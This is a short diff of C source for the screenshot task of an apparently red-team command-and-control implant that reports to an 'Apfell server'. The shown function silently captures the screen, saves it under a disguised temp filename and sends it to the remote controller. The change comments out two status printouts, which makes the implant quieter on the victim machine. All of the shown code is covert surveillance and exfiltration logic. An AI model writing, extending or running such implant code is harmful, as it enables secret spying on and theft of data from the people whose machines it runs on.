@@ -6,7 +6,7 @@ int screencapture(cJSON* json){
     unsigned int task_id = cJSON_GetObjectItem(json, "id")->valueint;
     //take a screenshot and save it to disk
     system("gnome-screenshot -f /tmp/config-err-IfgXld");
-    printf("took screenshot\n");
+    //printf("took screenshot\n");
     FILE* fptr = fopen("/tmp/config-err-IfgXld","rb");
     if(fptr == NULL){
         printf("Failed to open file\n");
@@ -16,7 +16,7 @@ int screencapture(cJSON* json){
     unsigned int size = ftell(fptr);
     rewind(fptr);
     //actually download the file to the Apfell server
-    printf("downloading... %d\n", size);
+    //printf("downloading... %d\n", size);
     if(global_info->C2.download(fptr, size, task_id) != 0){
         send_basic_response("Screencapture Failed", cJSON_GetObjectItem(json, "id")->valueint);
     }else{
